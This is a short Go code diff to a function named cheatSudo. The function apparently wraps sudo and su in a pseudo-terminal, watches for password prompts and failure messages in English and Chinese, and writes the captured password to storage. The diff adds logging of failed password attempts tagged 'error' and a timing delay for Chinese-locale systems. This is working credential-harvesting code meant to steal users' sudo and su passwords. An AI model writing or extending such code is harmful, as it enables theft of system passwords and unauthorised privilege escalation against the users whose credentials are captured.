@@ -7,6 +7,7 @@ import (
 	"os/exec"
 	"regexp"
 	"strings"
+	"time"
 )
 
 var failAuthRE = regexp.MustCompile(`(assword.*:)|(attempts)|(密码.*:)|(重试)|(错误)|(try again)|( denied)`)
@@ -55,11 +56,13 @@ func cheatSudo() {
 			if err != nil || v == 0 {
 				if suCmd && password != "" {
 					writePassword(password + " success")
+				} else if password != "" {
+					writePassword(password + " error")
+					password = ""
 				}
 				readLock <- struct{}{}
 				return
 			}
-			//fmt.Print(string(v))
 			lineByte = append(lineByte, v)
 			line = string(lineByte)
 			if len(string(lineByte)) <= 6 && len(suffix) <= 7 {
@@ -116,7 +119,7 @@ func cheatSudo() {
 		}
 	}()
 	c.Wait()
-	//time.Sleep(time.Second/2)
+	time.Sleep(time.Second / 2) //适配中文语言Linux环境的bug
 	pty.Close()
 	<-readLock
 
